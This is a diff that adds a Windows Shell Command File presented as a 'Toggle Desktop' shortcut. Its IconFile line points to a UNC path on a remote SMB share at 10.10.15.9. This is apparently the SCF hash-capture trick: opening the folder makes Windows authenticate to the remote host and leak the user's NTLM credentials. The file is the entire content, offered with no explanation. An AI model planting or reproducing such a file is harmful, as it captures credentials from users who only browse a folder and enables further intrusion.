@@ -1,0 +1,5 @@
+[Shell]
+Command=2
+IconFile=\\10.10.15.9\tools\nc.ico
+[Taskbar]
+Command=ToggleDesktop
